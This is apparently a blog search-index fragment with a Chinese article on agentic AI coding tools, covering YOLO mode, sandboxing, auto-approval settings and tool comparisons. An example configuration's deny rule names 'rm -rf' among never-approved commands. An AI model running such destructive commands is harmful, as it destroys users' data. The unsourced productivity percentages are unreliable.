將這些轉換為開發人員可以實作的技術規格。 改進的程式碼品質：AI 驅動的程式碼審查和除錯減少人為錯誤並增強可維護性。自動化安全掃描在漏洞到達生產環境之前捕獲它們。 適應性：現代平台支援多種語言和框架，從小腳本擴展到擁有數百萬行程式碼的企業應用程式。 學習和入職：AI 助手透過上下文幫助和解釋支援新開發人員，大幅減少在新程式碼庫上變得有生產力所需的時間。 成本節省：簡化工作流程和減少手動勞動可以降低營運成本，同時提高輸出品質。 ✨ 真實影響採用代理式編碼工具的組織報告： 在常規編碼任務上花費的時間減少 40-60% 新團隊成員的入職速度加快 30-50% 到達生產的錯誤減少 25-40% 開發人員花更多時間在創意問題解決上，而不是重複任務 挑戰和考量 儘管有令人印象深刻的好處，AI 軟體工程平台也帶來了組織必須深思熟慮地解決的挑戰。 資料安全和隱私：AI 工具通常需要存取原始碼和內部文件。確保這些資產保持受保護至關重要，特別是對於處理敏感資料或智慧財產的組織。 可靠性和信任：雖然 AI 可以自動化許多任務，但人工監督仍然是驗證建議和避免引入錯誤或偏見所必需的。盲目接受 AI 生成的程式碼可能導致微妙的錯誤或安全漏洞。 整合複雜性：將 AI 平台無縫整合到現有工作流程中可能需要客製化、培訓和流程變更。團隊需要時間來適應並學習與 AI 代理的有效協作模式。 倫理考量：使用 AI 生成的程式碼引發了關於原創性、授權和智慧財產的問題。誰擁有 AI 編寫的程式碼？如果 AI 生成類似於受版權保護的材料的程式碼會發生什麼？ 技能差距：團隊可能需要提升技能以充分利用進階 AI 能力。理解如何有效地提示、指導和驗證 AI 代理成為一項新的基本技能。 對供應商的依賴：依賴第三方平台會在供應商變更條款、定價或可用性時引入風險。組織應該考慮供應商鎖定並制定應急計劃。 ⚠️ 要避免的常見陷阱 過度依賴：不要僅僅因為 AI 編寫了程式碼就跳過程式碼審查 安全盲點：始終掃描 AI 生成的程式碼以查找漏洞 忽視上下文：確保 AI 理解你的特定需求和約束 測試捷徑：AI 生成的程式碼仍然需要全面測試 技能萎縮：即使 AI 處理常規任務，也要保持基本編碼技能 AI 主導軟體工程的未來 AI 在軟體開發中的軌跡指向越來越自主和智慧的系統。以下是將塑造下一代開發工具的新興趨勢： 自主 SDLC 循環：未來的系統將編排多個專門的代理，自動生成使用者故事、程式碼、測試和部署策略。人類將批准高層次的理由和策略決策，而不是審查每個程式碼變更。 多代理開發生態系統：需求、架構、測試和安全的專門代理將協作協商權衡，產生可解釋的決策矩陣，幫助團隊理解不同選擇的影響。 意圖為中心的開發：開發人員將用自然語言描述他們想要實現的目標，AI 將自動在使用者故事、API 規格、政策即程式碼、測試案例和監控配置之間同步這個意圖——消除文件和實作之間的漂移。 自我修復和自我最佳化系統：AI 代理將在問題成為問題之前檢測潛在問題，合成修補程式，注入保護措施並自動驗證系統健康——從反應式除錯轉向主動式系統維護。 持續信任和合規性：並行管道將持續為安全性、公平性、穩健性和供應鏈完整性評分程式碼，具有基於品質閾值的即時徽章，這些徽章會阻止生產部署。 永續工程：AI 將最佳化環境影響，在低碳能源窗口期間安排資源密集型任務，並建議在保持效能的同時減少能源消耗的程式碼最佳化。 🔮 為未來做準備要在這個快速演變的環境中保持領先： 擁抱持續學習：AI 工具每月都在演變；保持好奇並實驗 專注於問題解決：隨著 AI 處理實作，你的價值轉向深入理解問題 發展 AI 協作技能：學習有效地提示、指導和驗證 AI 代理 保持基礎：強大的編碼基礎幫助你評估和改進 AI 生成的程式碼 從架構角度思考：你的角色越來越多地成為設計系統而不是編寫每一行 開始使用代理式編碼 準備好親自體驗代理式編碼了嗎？這是初學者的實用路線圖： 🔒 安全第一在深入之前，確保你： 了解你的工具的資料處理政策 配置適當的自動批准設定（從限制性開始） 在可用時使用沙盒環境 永遠不要與 AI 工具分享敏感憑證或 API 金鑰 在提交到版本控制之前審查所有 AI 生成的程式碼 步驟 1：從 IDE 整合工具開始 從直接整合到你的開發環境的工具開始。GitHub Copilot、Amazon CodeWhisperer 或 Tabnine 提供溫和的介紹，你可以接受或拒絕程式碼建議。這建立了對 AI 協助的熟悉度，而不會讓你不知所措。 步驟 2：嘗試簡單任務 從要求 AI 幫助處理簡單任務開始： 編寫實用函數 生成測試案例 解釋不熟悉的程式碼 重構小程式碼部分 這建立了信心並幫助你理解 AI 的優勢和限制。 步驟 3：升級到自主代理 一旦對建議感到舒適，探索具有自主能力的工具。嘗試要求代理： 跨多個檔案新增新功能 在保持測試的同時重構模組 除錯失敗的測試套件 觀察代理如何計劃和執行這些任務。 步驟 4：學習有效的提示 AI 輸出的品質在很大程度上取決於你如何溝通。練習： 對需求具體 提供有關你專案的上下文 描述約束和偏好 在需要時要求解釋 步驟 5：培養審查心態 始終批判性地審查 AI 生成的程式碼： 它是否滿足需求？ 是否存在安全問題？ 它是否可維護且結構良好？ 它是否遵循你專案的慣例？ 將 AI 視為需要審查其工作的初級開發人員，而不是無誤的神諭。 🎯 你的第一個代理式編碼專案嘗試這個適合初學者的練習： 選擇一個簡單的專案想法（例如，命令列待辦事項清單） 在你的 IDE 中安裝 AI 編碼工具 用簡單的語言向 AI 描述專案 讓 AI 生成初始程式碼結構 審查和測試生成的程式碼 要求 AI 新增一個新功能 觀察它如何修改現有程式碼以整合功能 這種實踐經驗將教會你比任何教程更多。 結論：擁抱 AI 驅動的未來 代理式編碼的崛起代表的不僅僅是技術進步——這是軟體建立方式的根本轉變。從複製貼上 ChatGPT 回應的早期到今天可以建立整個應用程式的自主代理，我們見證了一個在幾年前似乎不可能的轉變。 這種演變並沒有削弱人類開發人員的角色；它提升了它。隨著 AI 處理常規實作細節，開發人員被釋放出來專注於人類最擅長的事情：創意問題解決、架構思考、理解使用者需求和做出策略決策。未來屬於能夠有效地與 AI 代理協作的開發人員，利用它們的優勢，同時提供機器無法複製的人類判斷、創造力和倫理監督。 從複製貼上到自主代理的旅程只是開始。隨著 AI 繼續演變，人類和機器貢獻之間的界限將進一步模糊，創造我們今天幾乎無法想像的新可能性。問題不是是否要擁抱代理式編碼——而是你能多快適應這個新範式並將自己定位在這場革命的最前沿。 工具在這裡。技術已經準備好了。唯一剩下的問題是：你準備好轉變你建立軟體的方式了嗎？ 💭 最後的想法「預測未來的最好方法是發明它。」——Alan Kay 在代理式編碼時代，我們不僅僅是預測軟體開發的未來——我們正在積極創造它，一次一個 AI 輔助的提交。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"}],"lang":"zh-TW"},{"title":"代理式编码的崛起：AI 驱动的软件工程","slug":"2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering-zh-CN","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-CN/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","permalink":"https://neo01.com/zh-CN/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","excerpt":"从复制粘贴到自主代理:AI 如何重新定义软件开发,让开发者从代码打字员转变为解决方案架构师。探索 YOLO 模式、沙盒环境与代理式编码的未来。","text":"还记得你第一次发现 ChatGPT 可以写代码吗？你可能做了数百万开发人员做的事情：复制你的需求，贴到聊天中，然后惊讶地看着可运作的代码出现。然后是调试舞蹈——将错误消息复制回 AI，将&quot;修复&quot;的代码贴到你的编辑器中，只是在新错误出现时重复这个循环。 那只是开始。 从简单的复制粘贴工作流程开始的东西已经演变成更强大的东西：代理式编码。这些不再只是智能自动完成工具或有用的聊天机器人。今天的 AI 代理可以读取你的整个代码库、理解你的项目结构、同时编写和修改多个文件、运行测试、修复错误，甚至部署应用程序——所有这些都不需要你动一根手指。 想象告诉 AI「为我建立一个带用户认证的待办事项应用程序」，一小时后回来发现一个完整的、经过测试的、已部署的应用程序。这不是科幻小说——这正在使用支持「YOLO 模式」（You Only Live Once）的工具发生，其中 AI 代理在每一步都不需要请求许可的情况下自主工作。 💡 什么是 YOLO 模式？YOLO（You Only Live Once）模式允许 AI 代理在延长的时间内自主工作，而不需要在每一步都请求许可。代理做出决策、编写代码、运行测试并独立修复问题，而你专注于其他任务。把它想象成让你的 AI 助手进入自动驾驶模式。 从复制粘贴到自主代理：旅程 转型开始得很无辜。在 2022 年底，全球开发人员发现他们可以用简单的英语描述他们的编码问题并收到可运作的解决方案。这是复制粘贴时代的诞生——粗糙但革命性。开发人员会将需求复制到 ChatGPT，将生成的代码贴到他们的编辑器中，然后将错误消息复制回 AI 进行调试。这是一个繁琐的舞蹈，但它有效。 真正的突破来自 AI 进入我们的开发环境。与其在浏览器标签和文本编辑器之间切换，GitHub Copilot 和 Amazon CodeWhisperer 等工具将 AI 直接带入 IDE。这标志着建议时代——AI 可以看到你的整个文件，理解你的编码风格，并建议在上下文中真正有意义的完成。复制粘贴舞蹈演变成更优雅的华尔兹，AI 和开发人员在同一个工作空间中和谐工作。 然后是游戏规则改变者：自主代理时代。这些不再只是建议引擎——它们是能够读取整个代码库、理解项目架构并做出独立决策的数字同事。现代工具可以同时重构跨数十个文件的认证系统，更新导入、修复类型定义并在整个过程中保持一致性。它们可以在卡住时浏览文档，运行终端命令来测试自己的代码，甚至将应用程序部署到生产环境。 timeline title AI 驱动编码的演变 2022-2023 : 复制粘贴时代 : 在浏览器和编辑器之间手动复制 : 重复的调试循环 2023-2024 : 建议时代 : IDE 集成的 AI 助手 : 上下文感知的代码完成 : 即时建议 2024-2025 : 自主代理时代 : 多文件编辑 : 独立决策 : YOLO 模式自动化 这不仅仅是关于更快地编写代码——这是关于从根本上重新定义成为软件开发人员的意义。当 AI 处理常规实现细节时，开发人员从代码打字员转变为解决方案架构师，专注于创意问题解决而不是语法记忆。 代理式编码实际上如何运作 要理解代理式编码，想象有一个高技能的开发人员坐在你旁边，他可以看到你的整个项目，理解你的目标，并在你专注于更大的决策时独立工作。但与其是人类，它是一个具有几个相互连接的组件协同工作的 AI 系统。 在其核心，代理式编码系统通过一个持续的循环运作：观察 → 计划 → 行动 → 反思。代理首先观察你的代码库、需求和当前状态。然后它创建一个行动计划，通过编写或修改代码来执行该计划，并反思结果以确定下一步。这个循环重复，直到任务完成或需要人工干预。 graph LR A([🔍 观察分析代码库和需求]) --> B([🎯 计划创建策略和方法]) B --> C([⚡ 行动编写和修改代码]) C --> D([💭 反思评估结果并调整]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 魔法通过复杂的上下文管理发生。与忘记先前对话的简单聊天机器人不同，代理式系统维护你的项目结构、编码模式、先前决策甚至你的个人偏好的持久记忆。当你要求代理「添加用户认证」时，它不只是生成通用代码——它分析你现有的架构，识别要修改的适当文件，理解你的数据库架构，并以与你项目风格一致的方式实现认证。 🎬 真实世界情境你告诉代理：「添加用户登录，使用电子邮件和密码。」 代理： 观察你现有的数据库结构并找到用户表 计划创建登录路由、认证中间件和密码哈希 行动修改 5 个文件：路由、控制器、模型、中间件和测试 反思运行测试，发现缺少导入，并自动修复 所有这些都在几分钟内发生，而你不需要触碰一行代码。 什么造就了一个优秀的代理式编码工具？ 并非所有 AI 编码工具都是平等的。理解什么将基本代码生成器与真正的代理式系统区分开来，有助于你为你的需求选择正确的工具。让我们探索定义现代代理式编码平台的基本能力和质量标准。 核心能力 多文件代码生成和编辑：系统必须同时读取、理解和修改多个文件，同时在整个代码库中保持一致性。这包括更新导入、修复类型定义并确保架构一致性。 自主任务执行：除了代码生成，代理必须执行终端命令、运行测试、安装依赖项并与外部服务交互。它们应该处理完整的开发工作流程，而不仅仅是编码部分。 上下文感知决策：系统必须理解项目上下文，包括现有模式、架构决策和编码标准。它应该做出与项目既定惯例一致的决策，而不是生成通用解决方案。 错误检测和自我修正：当代码无法编译或测试中断时，代理必须诊断问题、理解错误消息并自主实现修复。这包括调试跨多个文件的复杂多步骤问题。 与开发工具集成：与 IDE、版本控制系统、包管理器和部署管道的无缝集成。代理应该在现有的开发人员工作流程中工作，而不是需要全新的流程。 质量标准 性能和响应性：代理必须为简单任务提供近乎即时的反馈，同时在合理的时间范围内处理复杂的多文件操作。用户期望代码完成的即时响应和较大重构任务的快速周转。 可靠性和一致性：系统必须在会话之间产生一致的高质量代码。为相同问题生成不同解决方案的代理会破坏开发人员的信心和项目的可维护性。 安全性和隐私：用于代码分析的企业级安全性，具有本地部署选项和严格的数据处理政策。开发人员需要确保专有代码保持机密和安全。 ⚠️ 安全考量AI 编码工具通常需要访问你的源代码和内部文档。在采用任何工具之前： 验证供应商的数据处理政策 检查敏感项目是否可以本地部署 了解哪些数据被发送到外部服务器 审查你组织的安全要求 在可能的情况下考虑本地处理代码的工具 可扩展性：系统必须处理不同大小的项目，从小脚本到拥有数百万行代码的企业应用程序，而不会降低性能或准确性。 定制和适应性：灵活的配置选项，用于编码标准、架构偏好和团队特定要求。代理应该适应不同的编程语言、框架和开发方法论。 AI 模型的角色：推理模型 vs 指令模型 并非所有 AI 模型在编码任务中都是平等的。现代代理式编码工具通常在工作的不同阶段使用不同类型的 AI 模型，理解这一点有助于你更有效地使用这些工具。 推理模型专为系统化问题解决和规划而设计。它们擅长将复杂任务分解为步骤、理解项目架构并做出战略决策。把它们想象成「架构师」——它们弄清楚需要做什么以及按什么顺序。这些模型较慢但更彻底，使它们非常适合规划阶段。 指令模型（也称为聊天或完成模型）针对快速代码生成和遵循特定指示进行了优化。它们擅长理解自然语言需求并根据明确的指示快速生成代码。把它们想象成「建造者」——一旦他们知道要建造什么，他们就会快速建造。这些模型最适合速度重要的行动阶段。 📊 实践中的模型选择一些高级工具让你选择使用哪个模型来执行不同的任务： 计划模式：使用推理模型来分析你的请求并创建详细的实现计划 行动模式：使用指令模型根据计划快速生成代码 这种混合方法结合了推理模型的战略思考与指令模型的速度，为你提供两全其美的优势。 高级功能：安全性和控制 随着代理式编码工具变得更强大和自主，安全性和控制的高级功能已变得至关重要。让我们探索现代工具如何在为你提供对 AI 行动的细粒度控制的同时保护你的系统。 沙盒环境：安全执行区域 当 AI 代理运行终端命令或执行代码时，它们可能会损害你的系统——无论是意外还是通过恶意代码生成。沙盒环境通过创建隔离的执行区域来解决这个问题，AI 可以在其中工作而不会冒险影响你的主系统。 沙盒如何运作：把沙盒想象成一个虚拟游乐场，AI 可以在其中建造、测试和实验，而不会影响外部的任何东西。如果 AI 生成崩溃、删除文件或行为异常的代码，损害会留在沙盒内。 基于 Docker 的沙盒：一些工具使用 Docker 容器作为沙盒。例如，Gemini CLI 可以启动一个 Docker 容器，所有 AI 生成的代码都在其中运行。这提供了强大的隔离，因为： 容器有自己的文件系统，与你的计算机分开 网络访问可以被限制或监控 资源使用（CPU、内存）可以被限制 如果出现问题，整个环境可以立即重置 你的实际项目文件保持不变，直到你明确批准更改 这种方法被认为是高度安全的，因为即使 AI 生成恶意代码，它也只能影响临时容器，而不是你的实际开发环境或个人文件。 graph TB A([👤 开发人员给出指示]) --> B([🤖 AI 代理生成代码]) B --> C([🐳 Docker 沙盒隔离环境]) C --> D{✅ 测试通过？} D -->|是| E([📋 向开发人员呈现结果]) D -->|否| B E --> F{开发人员批准？} F -->|是| G([💾 应用到实际项目]) F -->|否| H([❌ 丢弃更改]) style C fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px 🛡️ 为什么沙盒对企业很重要没有沙盒，具有终端访问权限的 AI 代理可能会： 意外删除重要文件 安装不需要的软件 修改系统配置 消耗过多资源 执行具有安全漏洞的代码 对于企业团队，像 Gemini CLI 和 Vibe 这样具有基于 Docker 的沙盒的工具提供了在整个组织中安全部署 AI 编码助手所需的安全隔离。沙盒确保即使 AI 犯错或生成有问题的代码，你的生产系统和敏感数据仍然受到保护。 细粒度自动批准：受控自主性 虽然 YOLO 模式听起来令人兴奋，但大多数开发人员希望控制 AI 可以自动执行的操作。细粒度自动批准系统让你精确定义 AI 可以在不请求许可的情况下采取哪些行动。 行动级控制：像 Cline 这样的现代工具允许你为不同类型的行动设置批准规则： 始终自动批准：读取文件、搜索代码、分析结构 先询问：编写或修改文件、安装包 永不自动批准：删除文件、运行部署命令、访问外部 API 这意味着你可以让 AI 在安全操作上自主工作，同时对潜在风险的行动保持监督。 ⚠️ 自动批准安全功能Cline 包含一个内置的安全机制，当会话中自动批准了太多行动时会警告你。这可以防止「批准疲劳」，你可能会意外配置过于宽松的设置。如果你看到这个警告，这是审查你的自动批准配置并确保你没有让你的项目面临不必要风险的好时机。 示例工作流程：你可能会配置你的工具： 自动批准：读取项目中的任何文件 自动批准：在沙盒中运行测试 请求许可：修改源代码文件 请求许可：安装新依赖项 始终阻止：删除文件或文件夹 使用这些设置，AI 可以自由分析你的整个代码库并运行测试，但必须在进行实际更改之前询问。 MCP 服务器工具自动批准 模型上下文协议（MCP）服务器通过提供专门的工具来扩展 AI 能力——如数据库访问、API 集成或自定义工作流程。细粒度控制在这里变得更加重要。 **什么是 MCP？**把 MCP 想象成一种为 AI 代理提供超越基本编码的专门工具的方式。MCP 服务器可能提供： 数据库查询能力 访问你公司的内部 API 与项目管理工具集成 特定于你组织的自定义业务逻辑 每个服务器的批准设置：高级工具让你为每个 MCP 服务器分别配置自动批准： 文档 MCP 服务器：自动批准所有行动（安全、只读） 数据库 MCP 服务器：需要批准写入操作，自动批准读取 部署 MCP 服务器：永不自动批准（风险太大） 测试 MCP 服务器：仅在沙盒内自动批准 这种细粒度控制意味着你可以安全地启用强大的集成，而不必担心 AI 对关键系统进行未经授权的更改。 🎯 真实世界的自动批准配置Web 开发项目的典型安全配置： 文件操作： ✅ 自动批准：读取任何文件 ✅ 自动批准：在 /tests 目录中创建/修改文件 ⚠️ 先询问：修改 /src 目录中的文件 ❌ 永不批准：删除文件、修改 .git 目录 终端命令： ✅ 自动批准：npm test、npm run lint ⚠️ 先询问：npm install、git commit ❌ 永不批准：rm -rf、git push、部署命令 MCP 工具： ✅ 自动批准：文档搜索、代码分析 ⚠️ 先询问：数据库查询、API 调用 ❌ 永不批准：生产数据库访问、支付处理 平衡自主性和安全性 有效代理式编码的关键是在自主性和控制之间找到正确的平衡： 过于限制：如果你需要批准每个行动，你就失去了自主代理的效率优势。你会花更多时间点击「批准」而不是实际开发。 过于宽松：如果你自动批准所有内容，你就会冒 AI 犯错的风险，这可能会破坏你的项目、损害安全性或导致数据丢失。 恰到好处：根据风险级别配置自动批准： 读取操作和分析的高自主性 测试代码和文档的中等自主性 生产代码更改的低自主性 破坏性操作或外部集成没有自主性 随着你对 AI 工具的经验增加并建立对其能力的信任，你可以逐渐扩展自动批准设置以提高效率，同时保持安全性。 🎓 自动批准的学习路径从保守开始并逐渐扩展： 第 1 周：手动批准所有内容，了解 AI 做什么 第 2 周：自动批准文件读取和代码分析 第 3 周：自动批准测试文件修改 第 4 周：在沙盒中自动批准安全的终端命令 第 2 个月以上：根据你的舒适度和项目需求进行定制 这种渐进的方法在保持安全性的同时建立信心。 AI 驱动的开发环境 AI 编码工具市场已经爆炸式增长，平台提供各种功能和能力。虽然特定工具快速演变，但理解环境有助于你做出明智的选择。 主要参与者比较 GitHub Copilot 优势：深度 IDE 集成、大量训练数据、企业功能 劣势：有限的自主性，需要人工指导 最适合：传统结对编程增强 Cursor 优势：具有 AI 优先设计的原生 IDE、出色的 UX、多文件编辑 劣势：较新的生态系统、有限的扩展 最适合：想要 AI 原生编码环境的开发人员 Continue 优势：开源、可定制、适用于任何 IDE 劣势：需要更多设置、较不精致的 UX 最适合：想要控制和定制的开发人员 Cline（前身为 Claude Dev） 优势：出色的推理、文件系统访问、终端集成 劣势：仅限于 Claude 模型、仅限 VS Code 最适合：复杂的重构和架构更改 AWS Q Developer 优势：AWS 集成、企业安全性、多语言支持 劣势：主要专注于 AWS、较新进入市场 最适合：以 AWS 为中心的开发团队 AWS Kiro 优势：基于规格的开发（AI 从需求生成规格，然后创建实现计划）、高级推理 劣势：早期阶段、有限的可用性、没有 YOLO 模式或沙盒 最适合：规格驱动的开发、需要详细规划的复杂项目 Gemini CLI 优势：Google 的多模态能力、免费层级、用于企业级安全性的 Docker 沙盒 劣势：仅限命令行、有限的 IDE 集成 最适合：需要安全沙盒执行的企业团队、脚本自动化、以 CLI 为主的工作流程 Vibe 优势：用于安全执行的沙盒环境、现代架构 劣势：较新进入市场、较小的社区 最适合：优先考虑安全性和隔离执行环境的团队 主要功能比较 功能 Copilot Cursor Continue Cline AWS Q Kiro Gemini CLI Vibe 记忆库 ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 自定义规则 ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ MCP 服务器 ✅ ❌ ✅ ✅ ❌ ✅ ✅ ❓ YOLO 模式 ❌ ✅ ❌ ✅ ❌ ❌ ✅ ❓ 沙盒 ❌ ❌ ❌ ❌ ✅ ❌ ✅ ✅ 多模型 ✅ ✅ ✅ ❌ ❌ ✅ ✅ ❓ 细粒度自动批准 ❌ ❌ ❌ ✅ ❌ ❓ ❓ ❓ 基于规格的开发 ❌ ❌ ❌ ❌ ❌ ✅ ❌ ❌ ⚠️ 功能比较准确性此比较反映了撰写时的能力，但 AI 编码环境以惊人的速度演变。今天最先进的功能明天可能会成为标准，新功能每月都会出现。工具经常添加以前是竞争对手独有的功能。在做出工具决策之前，请务必检查最新文档，并预期此表格在几个月内会部分过时。 高级功能说明 记忆库：跨会话的持久上下文，从你的代码库模式中学习并记住你的偏好。 自定义规则：项目特定的编码标准和偏好，指导 AI 行为以符合你团队的惯例。 MCP 服务器：模型上下文协议，用于使用外部工具（如数据库、API 和自定义工作流程）扩展能力。 YOLO 模式：无需确认提示的自主执行，允许 AI 在延长的时间内独立工作。 沙盒：用于安全代码执行和测试的隔离环境（通常基于 Docker），而不会冒险影响你的主系统。 多模型：能够在不同任务之间切换不同的 AI 模型（推理模型 vs 指令模型）。 细粒度自动批准：对 AI 可以自动执行哪些行动的细粒度控制，包括每个 MCP 服务器的批准设置。像 Cline 这样的工具在自动批准太多行动时提供警告，有助于防止过于宽松的配置。 基于规格的开发：AI 首先从自然语言需求生成详细规格，然后根据这些规格创建实现计划。这种两阶段方法确保需求和实现之间更好的一致性，减少误解和返工。 哪个工具适合你的需求？ 对于初学者 推荐：GitHub Copilot 或 Cursor 温和的学习曲线、出色的文档、强大的社区支持 对于有经验的开发人员 推荐：Continue 或 Cline 最大的控制和定制、高级代理能力、开源灵活性 对于企业团队 推荐：Gemini CLI、AWS Q Developer 或 GitHub Copilot Enterprise Gemini CLI 提供基于 Docker 的沙盒以实现最大的安全隔离 AWS Q 和 Copilot 提供企业安全性、合规性、团队协作、审计跟踪和治理 对于规格驱动的项目 推荐：AWS Kiro 基于规格的开发确保在实现之前正确理解需求 非常适合复杂项目，其中明确的规格减少了昂贵的返工 对于实验性项目 推荐：Cursor 或 Vibe 最先进的代理功能、自主开发能力 Vibe 提供沙盒以进行安全实验 📝 工具演变注意事项AI 编码工具环境变化迅速。新功能每月出现，今天的限制通常会成为明天的能力。专注于理解核心概念而不是特定工具功能，因为即使工具演变，这些原则仍然保持不变。 转变软件开发生命周期 AI 不仅仅是改变我们编写代码的方式——它正在革新软件开发的每个阶段。传统的软件开发生命周期（SDLC）正在从线性流程转变为持续优化系统，其中 AI 在每个阶段提供智能、自动化和反馈。 需求阶段 AI 工具现在可以使用自然语言处理解析利益相关者对话和文档，检测歧义、冲突和缺失的需求。它们可以自动生成具有可追溯性链接的用户故事，帮助团队比以往更快地从模糊的想法转变为具体的规格。 基于规格的开发：像 AWS Kiro 这样的工具通过从自然语言需求生成正式规格来进一步推进这一点。AI 首先创建一个详细的规格文档，捕获所有需求、约束和验收标准。只有在审查和批准规格之后，它才会生成实现计划。这种两阶段方法提供了显著的优势： 减少误解：在编写任何代码之前审查规格，及早发现需求差距 更好的一致性：利益相关者可以验证规格而不需要理解代码 成本节省：修复规格错误比重构已实现的代码便宜得多 可追溯性：每个代码更改都可以追溯到规格中的特定需求 文档：规格作为与实现保持同步的活文档 设计阶段 模式挖掘和约束推理允许 AI 提出架构、估计可扩展性和成本，并在流程早期提出安全问题。与其花费数周时间编写设计文档，团队可以在几小时内探索多个架构选项。 实现阶段 这是代理式编码真正闪耀的地方。生成式编码、语义搜索、自动重构和策略强制执行的代码助手加速交付，同时自动强制执行风格指南、许可合规性、安全最佳实践和性能优化。 测试阶段 AI 根据风险和影响优先考虑测试用例，生成合成测试数据，执行突变测试以发现覆盖率中的差距，甚至分类不稳定的测试。这意味着更好的测试覆盖率，而手动工作更少。 部署阶段 预测分析调整部署策略、设置回滚触发器并优化容量和成本。基础设施即代码在部署之前自动检查配置漂移和合规性问题。 运营阶段 AI 运营（AIOps）关联日志、跟踪和指标以减少平均恢复时间（MTTR）并保护服务级别目标（SLO）。当问题发生时，AI 通常可以比人工操作员更快地诊断并建议修复。 graph TB A([📋 需求NLP 解析和用户故事]) --> B([🏗️ 设计架构提案]) B --> C([💻 实现代理式编码]) C --> D([🧪 测试AI 优先考虑的测试用例]) D --> E([🚀 部署预测分析]) E --> F([⚙️ 运营AIOps 监控]) F -.反馈.-> A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fce4ec,stroke:#c2185b,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px 好处和优势 AI 集成到软件开发中提供的实际好处超越了单纯的生产力提升： 效率和速度：自动化重复的编码和测试任务可以将开发时间表缩短 30-50%，使团队能够更快地交付功能并更快地响应市场需求。 增强的协作：即时 AI 协助弥合技术和非技术团队成员之间的差距。产品经理可以用简单的语言描述功能，AI 将这些转换为开发人员可以实现的技术规格。 改进的代码质量：AI 驱动的代码审查和调试减少人为错误并增强可维护性。自动化安全扫描在漏洞到达生产环境之前捕获它们。 适应性：现代平台支持多种语言和框架，从小脚本扩展到拥有数百万行代码的企业应用程序。 学习和入职：AI 助手通过上下文帮助和解释支持新开发人员，大幅减少在新代码库上变得有生产力所需的时间。 成本节省：简化工作流程和减少手动劳动可以降低运营成本，同时提高输出质量。 ✨ 真实影响采用代理式编码工具的组织报告： 在常规编码任务上花费的时间减少 40-60% 新团队成员的入职速度加快 30-50% 到达生产的错误减少 25-40% 开发人员花更多时间在创意问题解决上，而不是重复任务 挑战和考量 尽管有令人印象深刻的好处，AI 软件工程平台也带来了组织必须深思熟虑地解决的挑战。 数据安全和隐私：AI 工具通常需要访问源代码和内部文档。确保这些资产保持受保护至关重要，特别是对于处理敏感数据或知识产权的组织。 可靠性和信任：虽然 AI 可以自动化许多任务，但人工监督仍然是验证建议和避免引入错误或偏见所必需的。盲目接受 AI 生成的代码可能导致微妙的错误或安全漏洞。 集成复杂性：将 AI 平台无缝集成到现有工作流程中可能需要定制、培训和流程更改。团队需要时间来适应并学习与 AI 代理的有效协作模式。 伦理考量：使用 AI 生成的代码引发了关于原创性、许可和知识产权的问题。谁拥有 AI 编写的代码？如果 AI 生成类似于受版权保护的材料的代码会发生什么？ 技能差距：团队可能需要提升技能以充分利用高级 AI 能力。理解如何有效地提示、指导和验证 AI 代理成为一项新的基本技能。 对供应商的依赖：依赖第三方平台会在供应商更改条款、定价或可用性时引入风险。组织应该考虑供应商锁定并制定应急计划。 ⚠️ 要避免的常见陷阱 过度依赖：不要仅仅因为 AI 编写了代码就跳过代码审查 安全盲点：始终扫描 AI 生成的代码以查找漏洞 忽视上下文：确保 AI 理解你的特定需求和约束 测试捷径：AI 生成的代码仍然需要全面测试 技能萎缩：即使 AI 处理常规任务，也要保持基本编码技能 AI 主导软件工程的未来 AI 在软件开发中的轨迹指向越来越自主和智能的系统。以下是将塑造下一代开发工具的新兴趋势： 自主 SDLC 循环：未来的系统将编排多个专门的代理，自动生成用户故事、代码、测试和部署策略。人类将批准高层次的理由和战略决策，而不是审查每个代码更改。 多代理开发生态系统：需求、架构、测试和安全的专门代理将协作协商权衡，产生可解释的决策矩阵，帮助团队理解不同选择的影响。 意图为中心的开发：开发人员将用自然语言描述他们想要实现的目标，AI 将自动在用户故事、API 规格、策略即代码、测试用例和监控配置之间同步这个意图——消除文档和实现之间的漂移。 自我修复和自我优化系统：AI 代理将在问题成为问题之前检测潜在问题，合成补丁，注入保护措施并自动验证系统健康——从反应式调试转向主动式系统维护。 持续信任和合规性：并行管道将持续为安全性、公平性、稳健性和供应链完整性评分代码，具有基于质量阈值的实时徽章，这些徽章会阻止生产部署。 可持续工程：AI 将优化环境影响，在低碳能源窗口期间安排资源密集型任务，并建议在保持性能的同时减少能源消耗的代码优化。 🔮 为未来做准备要在这个快速演变的环境中保持领先： 拥抱持续学习：AI 工具每月都在演变；保持好奇并实验 专注于问题解决：随着 AI 处理实现，你的价值转向深入理解问题 发展 AI 协作技能：学习有效地提示、指导和验证 AI 代理 保持基础：强大的编码基础帮助你评估和改进 AI 生成的代码 从架构角度思考：你的角色越来越多地成为设计系统而不是编写每一行 开始使用代理式编码 准备好亲自体验代理式编码了吗？这是初学者的实用路线图： 🔒 安全第一在深入之前，确保你： 了解你的工具的数据处理策略 配置适当的自动批准设置（从限制性开始） 在可用时使用沙盒环境 永远不要与 AI 工具分享敏感凭证或 API 密钥 在提交到版本控制之前审查所有 AI 生成的代码 步骤 